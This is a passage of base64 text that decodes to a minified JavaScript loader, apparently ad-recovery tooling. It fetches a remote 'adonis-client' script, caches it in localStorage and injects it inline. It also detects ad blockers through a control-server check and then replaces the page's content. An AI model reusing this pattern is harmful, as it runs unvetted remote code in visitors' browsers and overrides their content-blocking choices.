IHIoZSx0KXt2YXIgbj0iY2FjaGUvc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZSIscj10WyJhZG9uaXMtY2xpZW50LXZlcnNpb24iXSxhPXRbImNhY2hlLWNvbnRyb2wiXSxjPWEmJmEuc3RhcnRzV2l0aCgibWF4LWFnZSIpLHU9dC5leHBpcnlNaWxsaXN8fDA7aWYoYyl7aS5sb2dnZXIuZGVidWcoYSk7dmFyIHM9cGFyc2VJbnQoYS5zcGxpdCgiPSIpWzFdLDEwKTtpc05hTihzKXx8KHU9KG5ldyBEYXRlKS5nZXRUaW1lKCkrMWUzKnMpfXImJihpLmxvZ2dlci5pbmZvKCJbIituKyJdOiBuZXcgZXhwaXJ5ICIrdSsiID0gIituZXcgRGF0ZSh1KSksbyhlLHIsdSkpfWZ1bmN0aW9uIG8oZSx0LG4pe3dpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2FjaGVTcmM9ZSx3aW5kb3cubG9jYWxTdG9yYWdlLmFkb25pc0NhY2hlRXhwaXJ5TWlsbGlzPW4sd2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDbGllbnRWZXJzaW9uPXR9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZT1yLG4uY2FjaGVBZG9uaXNDbGllbnQ9bzt2YXIgaT1lKDEyKX0sezEyOjEyfV0sNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0Ijt2YXIgcj1lKDUpO3dpbmRvdy5hZG9uaXNIYXNoPXdpbmRvdy5hZG9uaXNIYXNofHx3aW5kb3cubG9jYXRpb24uaGFzaHx8IiI7dmFyIG89d2luZG93LmFkb25pc0hhc2guaW5kZXhPZigiYWRvbmlzLWxvZ2dpbmciKT49MDtyLkxPR19MRVZFTD1vPyJkZWJ1ZyI6ci5MT0dfTEVWRUw7dmFyIGk9d2luZG93LmFkb25pc3x8e307aS53c0hvc3QmJnIuV1MmJihyLldTLmhvc3Q9aS53c0hvc3QpLGkudHJhbnNwb3J0JiZyLlNVRVpfSFRUUF9FTkRQT0lOVCYmKHIuU1VFWl9IVFRQX0VORFBPSU5UPWkudHJhbnNwb3J0KSx0LmV4cG9ydHM9cn0sezU6NX1dLDU6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7dC5leHBvcnRzPXtSRUFMX1NUVU5fSE9TVDoic3R1bi54cGFuYW1hLm5ldDozNDc4IixUVVJOU0lHTkFMX0hPU1Q6InRzLnAueHBhbmFtYS5uZXQ6NzAwMCIsU1RVTkdVTl9IT1NUOiJzZy5wLnhwYW5hbWEubmV0OjM0ODAiLFNFUlZFUl9DQU5ESURBVEU6ImNhbmRpZGF0ZTo4Mjc2NDgwMjYgMSB1ZHAgMjEyMjE5NDY4NyBTRVJWRVJfSVAgU0VSVkVSX1BPUlQgdHlwIGhvc3QgZ2VuZXJhdGlvbiAwIixSRVBPUlRJTkdfVVJMOiJodHRwczovL2xiLnN0YXRzZXZlbnQuY29tL3N0YXRzIixSRVBPUlRJTkdfUkFURTouMDEsTE9HX0xFVkVMOiJlcnJvciIsUkVQT1JUX0VSUk9SUzohMCxNQU5JRkVTVF9VUkw6Imh0dHBzOi8vc3JpLmpzaW50ZWdyaXR5LmNvbS9tYW5pZmVzdC5qc29uIixNQU5JRkVTVF9FWFBJUkFUSU9OX1RJTUU6ODY0MDAsQURfTUFSS0VSOiJhZG9uaXMtbWFya2VyIixBRE9OSVNfQ0xJRU5UX0ZFVENIX1VSTDoiaHR0cHM6Ly9hZHNlcnZlci54cGFuYW1hLm5ldC9jbGllbnQtNy1sYXRlc3QuanMiLFdTOntob3N0OiJzdWV6LXNlcnZlci54cGFuYW1hLm5ldCIscGF0aDoiL3dzIixwb3J0OjQ0MyxzZWN1cmU6ITAscHJvbWlzZVRpbWVvdXQ6M2UzfSxTRVJWSUNFX1NUQVRVU19VUkw6ZnVuY3Rpb24oZSl7cmV0dXJuImh0dHBzOi8vY2xpZW50LnJlYWN0cmpzLmNvbS8iK2UrIi1zdGF0dXMuanNvbiJ9LFNVRVpfSFRUUF9FTkRQT0lOVDoiaHR0cHM6Ly9zdWV6LnhwYW5hbWEubmV0L2h0dHAiLFNVRVpfSFRUUF9SRVRSWTozLFNVRVpfSFRUUF9ERUxBWToxMDB9fSx7fV0sNjpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oKXt2YXIgZT0iY29udHJvbC1zZXJ2ZXIvY2hlY2siO2YubG9nZ2VyLmluZm8oIlsiK2UrIl06IENoZWNraW5nIHNlcnZpY2Ugc3RhdHVzIik7dmFyIHQ9aSh3aW5kb3cpO3JldHVybigwLHUucmVxdWVzdCkodCkudGhlbihmdW5jdGlvbih0KXtyZXR1cm4gZi5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN0YXR1cyBjaGVjayBmZXRjaGVkIHdpdGggc3RhdHVzLWNvZGUgPCIrdC5zdGF0dXMrIj4iKSxKU09OLnBhcnNlKHQucmVzcG9uc2VUZXh0KX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe2YubG9nZ2VyLmluZm8oIlsiK2UrIl06IEZhaWxlZCB0byBjaGVjayBjb250cm9sIHNlcnZlciBzdGF0dXMgPCIrdCsiPiIpO3ZhciBuPXZvaWQgMCE9PXQucmVxP3QucmVxLnN0YXR1czpudWxsO3Rocm93IDA9PT1uP25ldyBzLlhockJsb2NrRXJyb3I6bmV3IEVycm9yKCJVbmV4cGVjdGVkIHN0YXR1cyBjb2RlIHdoaWxlIHBlcmZvcm1pbmcgY29udHJvbCBzZXJ2ZXIgY2hlY2ssIHN0YXR1cy1jb2RlID0gPCIrbisiPiIpfSl9ZnVuY3Rpb24gaShlKXtyZXR1cm4gZFsiZGVmYXVsdCJdLlNFUlZJQ0VfU1RBVFVTX1VSTChjWyJkZWZhdWx0Il0uZ2V0KGUubG9jYXRpb24uaG9zdCkpfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmNoZWNrPW8sbi5nZXRTZXJ2aWNlU3RhdHVzVXJsPWk7dmFyIGE9ZSgyNCksYz1yKGEpLHU9ZSgxOCkscz1lKDkpLGw9ZSg0KSxkPXIobCksZj1lKDEyKX0sezEyOjEyLDE4OjE4LDI0OjI0LDQ6NCw5Ojl9XSw3OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7aWYoZSYmZS5fX2VzTW9kdWxlKXJldHVybiBlO3ZhciB0PXt9O2lmKG51bGwhPWUpZm9yKHZhciBuIGluIGUpT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKGUsbikmJih0W25dPWVbbl0pO3JldHVybiB0WyJkZWZhdWx0Il09ZSx0fWZ1bmN0aW9uIG8oZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gaSgpe3ZhciBlPSJodHRwLWFkb25pcy1jbGllbnQtbG9hZGVyL3J1biI7cmV0dXJuIHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAucGFnZXZpZXciKSxnWyJkZWZhdWx0Il0uaXNTdXBwb3J0ZWRCcm93c2VyKCk/KHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IEJyb3dzZXIgaXMgY29tcGF0aWJsZSIpLHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3VwcG9ydGVkIiksYSgpLnRoZW4oZnVuY3Rpb24odCl7cmV0dXJuIHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IFJ1bm5pbmcgYW5kIGNhY2hpbmcgYWRvbmlzQ2xpZW50IHNvdXJjZSIpLHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAucnVuY2xpZW50c2NyaXB0IikscFsiZGVmYXVsdCJdLnNhdmVUaW1pbmcoKSxkWyJkZWZhdWx0Il0uZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eSgiYWRvbmlzQ29uZmlnIixzWyJkZWZhdWx0Il0pLCgwLG0uc3RvcmVBZG9uaXNDbGllbnRSZXNwb25zZSkodC5zb3VyY2UsdC5tZXRhKSx2WyJkZWZhdWx0Il0uaW5zZXJ0SW5saW5lU2NyaXB0KHQuc291cmNlKSxudWxsfSlbImNhdGNoIl0oZnVuY3Rpb24odCl7cmV0dXJuIHQgaW5zdGFuY2VvZiBMLlhockJsb2NrRXJyb3I/KHkubG9nZ2VyLmluZm8oIlsiK2UrIl06IEZhaWxlZCB0byBmZXRjaCBhZG9uaXMtY2xpZW50IHVzaW5nIFN1ZXoiKSx5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBBbGwgbG9hZGVycyBmYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCwgY2hlY2tpbmcgY29udHJvbCBzZXJ2ZXIiKSxiLmNoZWNrKCkpOih5LmxvZ2dlci53YXJuKCJbIitlKyJdOiBVbmV4cGVjdGVkIGVycm9yIHdoZW4gdHJ5aW5nIHRvIGZldGNoIGFkb25pcy1jbGllbnQgb3ZlciBTdWV6OiA8Iit0KyI+IikscFsiZGVmYXVsdCJdLnJlcG9ydEVycm9yKHQpLG51bGwpfSlbImNhdGNoIl0oZnVuY3Rpb24odCl7cmV0dXJuIHQgaW5zdGFuY2VvZiBMLlhockJsb2NrRXJyb3I/KHBbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3RhdHVzX2Jsb2NrZWQiKSx5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBDb250cm9sIHNlcnZlciBjaGVjayBmYWlsZWQsIHByb2JhYmx5IGFuIGFkYmxvY2tlciIpLHtzdGF0dXM6ITB9KTooeS5sb2dnZXIud2FybigiWyIrZSsiXTogVW5leHBlY3RlZCBlcnJvciBmcm9tIGNvbnRyb2wgc2VydmVyIGNoZWNrOiA8Iit0KyI+IikscFsiZGVmYXVsdCJdLnJlcG9ydEVycm9yKHQpLG51bGwpfSkudGhlbihmdW5jdGlvbih0KXsoMCxTWyJkZWZhdWx0Il0pKHdpbmRvdy5uYXZpZ2F0b3IudXNlckFnZW50KSYmdCYmInN0YXR1cyJpbiB0JiZ0LnN0YXR1cz8ocFsiZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuaHR0cC50cmlnZ2VkIikseS5sb2dnZXIuaW5mbygiWyIrZSsiXTogQ29udHJvbCBzZXJ2ZXIgcmVwb3J0ZWQgc3RhdHVzIGlzIGhlYWx0aHkgb3Igd2FzIGJsb2NrZWQsIHRyaWdnZXJpbmcgb3BwZW5oZWltZXIiKSwoMCxjLnJlcGxhY2VDb250ZW50KSh3aW5kb3cuZG9jdW1lbnQpKTp0JiYic3RhdHVzImluIHQmJnQuc3RhdHVzPT09ITEmJihwWyJkZWZhdWx0Il0ucmVwb3J0RXZlbnQoImJvb3RzdHJhcC5odHRwLm5vdF90cmlnZ2VkIikseS5sb2dnZXIud2FybigiWyIrZSsiXTogQ29udHJvbCBzZXJ2ZXIgcmVwb3J0ZWQgc3RhdHVzIGlzIHVuaGVhbHRoeSwgbm90IHRyaWdnZXJpbmcgb3BwZW5oZWltZXIiKSl9KSk6dm9pZCB5LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBJbmNvbXBhdGlibGUgYnJvd3Nlciwgbm90IGNvbnRpbnVpbmciKX1mdW5jdGlvbiBhKCl7dmFyIGU9Imh0dHAtYWRvbmlzLWNsaWVudC1sb2FkZXIvbG9hZEFkb25pc0NsaWVudCI7cmV0dXJuIHkubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBUcnlpbmcgdG8gbG9hZCBhZG9uaXMtY2xpZW50IHdpdGggWEhSIGxvYWRlciAoZnJvbSBDRE4pIiksVC5sb2FkKClbImNhdGNoIl0oZnVuY3Rpb24odCl7cmV0dXJuIHQgaW5zdGFuY2VvZiBMLlhockJsb2NrRXJyb3I/eS5sb2dnZXIuaW5mbygiWyIrZSsiXTogRmFpbGVkIHRvIGZldGNoIGFkb25pcy1jbGllbnQgb3ZlciBYSFIsIHRyeWluZyB0byBsb2FkIGZyb20gY2FjaGUiKTooeS5sb2dnZXIud2FybigiWyIrZSsiXTogVW5leHBlY3RlZCBlcnJvciB3aGVuIHRyeWluZyBmZXRjaCBhZG9uaXMtY2xpZW50IG92ZXIgWEhSLCB0cnlpbmcgdG8gbG9hZCBmcm9tIGNhY2hlOiA8Iit0KyI+IikscFsiZGVmYXVsdCJdLnJlcG9ydEVycm9yKHQpKSxQLmxvYWQoKX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3JldHVybiB0IGluc3RhbmNlb2YgTC5DYWNoZUxvYWRFcnJvcj95LmxvZ2dlci5pbmZvKCJbIitlKyJdOiBGYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBmcm9tIGNhY2hlLCB0cnlpbmcgdG8gbG9hZCBmcm9tIFN1ZXoiKTooeS5sb2dnZXIud2FybigiWyIrZSsiXTogVW5leHBlY3RlZCBlcnJvciB3aGVuIHRyeWluZyBmZXRjaCBhZG9uaXMtY2xpZW50IGZyb20gY2FjaGUsIHRyeWluZyB0byBsb2FkIGZyb20gU3VlejogPCIrdCsiPiIpLHBbImRlZmF1bHQiXS5yZXBvcnRFcnJvcih0KSksQy5sb2FkKCl9KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5ydW49aSxuLmxvYWRBZG9uaXNDbGllbnQ9YTt2YXIgYz1lKDIwKSx1PWUoNCkscz1vKHUpLGw9ZSgxNyksZD1vKGwpLGY9ZSgxNSkscD1vKGYpLGg9ZSgyKSxnPW8oaCksdz1lKDE0KSx2PW8odyksXz1lKDYpLGI9cihfKSxtPWUoMykseT1lKDEyKSxFPWUoMTYpLFM9byhFKSxPPWUoMTEpLFQ9cihPKSxSPWUoMTApLEM9cihSKSxBPWUoOCksUD1yKEEpLEw9ZSg5KX0sezEwOjEwLDExOjExLDEyOjEyLDE0OjE0LDE1OjE1LDE2OjE2LDE3OjE3LDI6MiwyMDoyMCwzOjMsNDo0LDY6Niw4OjgsOTo5fV0sODpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKCl7dmFyIGU9ImxvYWRlcnMvY2FjaGUvbG9hZCI7YS5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN0YXJ0aW5nIGNhY2hlIGxvYWRlciIpLHdpbmRvdy5sb2NhbFN0b3JhZ2UuYWRvbmlzQ2FjaGVFeHBpcnkmJndpbmRvdy5sb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiYWRvbmlzQ2FjaGVFeHBpcnkiKTt2YXIgdD1wYXJzZUludCh3aW5kb3cubG9jYWxTdG9yYWdlLmFkb25pc0NhY2hlRXhwaXJ5TWlsbGlzLDEwKTtpc05hTih0KSYmKHQ9MCk7dmFyIG49d2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDbGllbnRWZXJzaW9uLHI9d2luZG93LmxvY2FsU3RvcmFnZS5hZG9uaXNDYWNoZVNyYyxvPShuZXcgRGF0ZSkuZ2V0VGltZSgpPj10LGM9eyJhZG9uaXMtY2xpZW50LXZlcnNpb24iOm4sZXhwaXJ5TWlsbGlzOnQsY2FjaGVkU291cmNlOnJ9O3JldHVybiByP28/KGEubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBDYWNoZWQgdmVyc2lvbiBvZiBhZG9uaXMtY2xpZW50IGlzIGV4cGlyZWQiKSxQcm9taXNlLnJlamVjdChuZXcgaS5DYWNoZUxvYWRFcnJvcihudWxsLGMpKSk6KGEubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBGb3VuZCBhIHZhbGlkIGNhY2hlZCB2ZXJzaW9uIG9mIGFkb25pcy1jbGllbnQiKSxQcm9taXNlLnJlc29sdmUoe3NvdXJjZTpyLG1ldGE6Y30pKTooYS5sb2dnZXIuZGVidWcoIlsiK2UrIl06IE5vIGNhY2hlZCB2ZXJzaW9uIG9mIGFkb25pcy1jbGllbnQgZm91bmQgaW4gdGhlIGxvY2FsU3RvcmFnZSIpLFByb21pc2UucmVqZWN0KG5ldyBpLkNhY2hlTG9hZEVycm9yKG51bGwsYykpKX1mdW5jdGlvbiBvKCl7cmV0dXJuIHIoKVsiY2F0Y2giXShmdW5jdGlvbihlKXtpZihlIGluc3RhbmNlb2YgaS5DYWNoZUxvYWRFcnJvcilyZXR1cm57c291cmNlOmUuc291cmNlLG1ldGE6ZS5tZXRhfX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmxvYWQ9cixuLmxvYWRJZ25vcmluZ0Vycm9ycz1vO3ZhciBpPWUoOSksYT1lKDEyKX0sezEyOjEyLDk6OX1dLDk6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXtyZXR1cm4gZSYmZS5fX2VzTW9kdWxlP2U6eyJkZWZhdWx0IjplfX1mdW5jdGlvbiBvKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gaShlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGEoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLkNhY2hlTG9hZEVycm9yPW4uV3NCbG9ja0Vycm9yPW4uWGhyQmxvY2tFcnJvcj12b2lkIDA7dmFyIGM9ZSgxOSksdT1yKGMpO24uWGhyQmxvY2tFcnJvcj1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KCl7cmV0dXJuIG8odGhpcyx0KSxpKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmFwcGx5KHRoaXMsYXJndW1lbnRzKSl9cmV0dXJuIGEodCxlKSx0fSh1WyJkZWZhdWx0Il0pLG4uV3NCbG9ja0Vycm9yPWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoKXtyZXR1cm4gbyh0aGlzLHQpLGkodGhpcywodC5fX3Byb3RvX198fE9iamVjdC5nZXRQcm90b3R5cGVPZih0KSkuYXBwbHkodGhpcyxhcmd1bWVudHMpKX1yZXR1cm4gYSh0LGUpLHR9KHVbImRlZmF1bHQiXSksbi5DYWNoZUxvYWRFcnJvcj1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KGUsbil7byh0aGlzLHQpO3ZhciByPWkodGhpcywodC5fX3Byb3RvX198fE9iamVjdC5nZXRQcm90b3R5cGVPZih0KSkuY2FsbCh0aGlzKSk7cmV0dXJuIHIuc291cmNlPWUsci5tZXRhPW4scn1yZXR1cm4gYSh0LGUpLHR9KHVbImRlZmF1bHQiXSl9LHsxOToxOX1dLDEwOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gbygpe3ZhciBlPSJsb2FkZXJzL3N1ZXotaHR0cCI7ZC5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN0YXJ0aW5nIFN1ZXogSFRUUCBsb2FkZXIiKTt2YXIgdD1KU09OLnN0cmluZ2lmeSh7aG9zdDoiYXNzZXRzIixwYXRoOiJjbGllbnQiLHBhcmFtczp7fSxoZWFkZXJzOnthZG9uaXNfY2xpZW50X2FwaToiNy4wLjAifX0pO3JldHVybigwLGwucmVxdWVzdCkoY1siZGVmYXVsdCJdLlNVRVpfSFRUUF9FTkRQT0lOVCwiUE9TVCIsdCkudGhlbihmdW5jdGlvbih0KXtkLmxvZ2dlci5kZWJ1ZygiWyIrZSsiXTogU3VjY2Vzc2Z1bGx5IGZldGNoZWQgYWRvbmlzLWNsaWVudCBvdmVyIFhIUiIpO3ZhciBuPXt9O3RyeXtuWyJhZG9uaXMtY2xpZW50LXZlcnNpb24iXT10LmdldFJlc3BvbnNlSGVhZGVyKCJhZG9uaXMtY2xpZW50LXZlcnNpb24iKX1jYXRjaChyKXt9dHJ5e25bImNhY2hlLWNvbnRyb2wiXT10LmdldFJlc3BvbnNlSGVhZGVyKCJjYWNoZS1jb250cm9sIil9Y2F0Y2gocil7fXJldHVybntzb3VyY2U6dC5yZXNwb25zZVRleHQsbWV0YTpufX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3Rocm93IGQubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBGYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBmcm9tIFN1ZXogb3ZlciBYSFIgPCIrdCsiPiIpLDA9PT10LnJlcS5zdGF0dXM/bmV3IGYuWGhyQmxvY2tFcnJvcjpuZXcgRXJyb3IoIlVuZXhwZWN0ZWQgZXJyb3IgZmV0Y2hpbiBhZG9uaXMtY2xpZW50LCBzdGF0dXMtY29kZSA9IDwiK3QucmVxLnN0YXR1cysiPiIpfSl9ZnVuY3Rpb24gaSgpe3ZhciBlPWNbImRlZmF1bHQiXS5TVUVaX0hUVFBfUkVUUll8fDEsdD1jWyJkZWZhdWx0Il0uU1VFWl9IVFRQX0RFTEFZfHwwLG49QXJyYXkuYXBwbHkoMCxBcnJheShlKSkubWFwKGZ1bmN0aW9uKGUpe3JldHVybiBvfSk7cmV0dXJuIHNbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3Vlel9vcGVuaW5nIiksKDAscC5jaGFpbikobix0KS50aGVuKGZ1bmN0aW9uKGUpe3JldHVybiBzWyJkZWZhdWx0Il0ucmVwb3J0RXZlbnQoImJvb3RzdHJhcC5odHRwLnN1ZXpfb3BlbmVkIiksZX0pWyJjYXRjaCJdKGZ1bmN0aW9uKGUpe3Rocm93IGUgaW5zdGFuY2VvZiBmLlhockJsb2NrRXJyb3ImJnNbImRlZmF1bHQiXS5yZXBvcnRFdmVudCgiYm9vdHN0cmFwLmh0dHAuc3Vlel9ibG9ja2VkIiksZX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmxvYWRPbmNlPW8sbi5sb2FkPWk7dmFyIGE9ZSg0KSxjPXIoYSksdT1lKDE1KSxzPXIodSksbD1lKDE4KSxkPWUoMTIpLGY9ZSg5KSxwPWUoMTMpfSx7MTI6MTIsMTM6MTMsMTU6MTUsMTg6MTgsNDo0LDk6OX1dLDExOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19ZnVuY3Rpb24gbygpe3ZhciBlPSJsb2FkZXJzL2NhY2hlL3hociI7cmV0dXJuIGQubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBTdGFydGluZyBYSFIgbG9hZGVyIiksKDAsbC5yZXF1ZXN0KShjWyJkZWZhdWx0Il0uQURPTklTX0NMSUVOVF9GRVRDSF9VUkwpLnRoZW4oZnVuY3Rpb24odCl7ZC5sb2dnZXIuZGVidWcoIlsiK2UrIl06IFN1Y2Nlc3NmdWxseSBmZXRjaGVkIGFkb25pcy1jbGllbnQgb3ZlciBYSFIiKTt2YXIgbj17ImFkb25pcy1jbGllbnQtdmVyc2lvbiI6bnVsbH07dHJ5e25bImNhY2hlLWNvbnRyb2wiXT10LmdldFJlc3BvbnNlSGVhZGVyKCJjYWNoZS1jb250cm9sIil9Y2F0Y2gocil7fXJldHVybntzb3VyY2U6dC5yZXNwb25zZVRleHQsbWV0YTpufX0pWyJjYXRjaCJdKGZ1bmN0aW9uKHQpe3Rocm93IGQubG9nZ2VyLmRlYnVnKCJbIitlKyJdOiBGYWlsZWQgdG8gZmV0Y2ggYWRvbmlzLWNsaWVudCBvdmVyIFhIUiA8Iit0KyI+IiksMD09PXQucmVxLnN0YXR1cz9uZXcgZi5YaHJCbG9ja0Vycm9yOm5ldyBFcnJvcigiVW5leHBlY3RlZCBlcnJvciBwZXJmb3JtaW5nIHN0YXR1cyBjaGVjayByZXF1ZXN0LCBzdGF0dXMtY29kZSA9IDwiK3QucmVxLnN0YXR1cysiPiIpfSl9ZnVuY3Rpb24gaSgpe3JldHVybiBvKClbImNhdGNoIl0oZnVuY3Rpb24oZSl7cmV0dXJuIGQubG9nZ2VyLmRlYnVnKCJmYWlsZWQgdG8gbG9hZCBhZG9uaXMtY2xpZW50IG92ZXIgaHR0cCIsZSksc1siZGVmYXVsdCJdLnJlcG9ydEV2ZW50KCJib290c3RyYXAuY2xpZW50X2h0dHBfZmV0Y2hfZXJyb3IiKSx7c291cmNlOm51bGwsbWV0YTp7fX19KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5sb2FkPW8sbi5sb2FkSWdub3JpbmdFcnJvcnM9aTt2YXIgYT1lKDQpLGM9cihhKSx1PWUoMTUpLHM9cih1KSxsPWUoMTgpLGQ9ZSgxMiksZj1lKDkpfSx7MTI6MTIsMTU6MTUsMTg6MTgsNDo0LDk6OX1dLDEyOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7cmV0dXJuIGUmJmUuX19lc01vZHVsZT9lOnsiZGVmYXVsdCI6ZX19dmFyIG89ZSg0KSxpPXIobyksYT1lKDI2KSxjPSgwLGEuY3JlYXRlKSh7bGV2ZWw6aVsiZGVmYXVsdCJdLkxPR19MRVZFTH0pO3QuZXhwb3J0cz17bG9nZ2VyOmMsc3VlekxvZ2dlcjpjfX0sezI2OjI2LDQ6NH1dLDEzOltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSx0LG4pe2lmKEFycmF5LmlzQXJyYXkoZSkmJjA9PT1lLmxlbmd0aClyZXR1cm4gUHJvbWlzZS5yZWplY3Qobik7dD10fHwwO3ZhciBpPWVbMF07cmV0dXJuIGU9ZS5zbGljZSgxKSxpKClbImNhdGNoIl0oZnVuY3Rpb24obil7cmV0dXJuIG8odCkudGhlbihmdW5jdGlvbihvKXtyZXR1cm4gcihlLHQsbil9KX0pfWZ1bmN0aW9uIG8oZSl7cmV0dXJuIG5ldyBQcm9taXNlKGZ1bmN0aW9uKHQsbil7c2V0VGltZW91dChmdW5jdGlvbihlKXtyZXR1cm4gdCgpfSxlKX0pfU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KSxuLmNoYWluPXJ9LHt9XSwxNDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7YS5kZWJ1ZygiaW5zZXJpbmcgYmxvYiIpO3ZhciBuPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO24uc3JjPWUsdCYmKG4uaW50ZWdyaXR5PXQpLGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobil9ZnVuY3Rpb24gbyhlLHQpe3ZhciBuPW5ldyB3aW5kb3cuWE1MSHR0cFJlcXVlc3Q7dHJ5e24ub3BlbigiR0VUIixlLCEwKSxuLmFkZEV2ZW50TGlzdGVuZXIoInJlYWR5c3RhdGVjaGFuZ2UiLGZ1bmN0aW9uKGUpezQ9PT1uLnJlYWR5U3RhdGUmJjA9PT1uLnN0YXR1cyYmaSh0KX0pLG4uc2VuZCgpfWNhdGNoKHIpe2Eud2FybigiRmFsbGluZyBiYWNrIHRvIGluc2VydGluZyBpbmxpbmUgc2NyaXB0IiksaSh0KX19ZnVuY3Rpb24gaShlKXt2YXIgdD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTt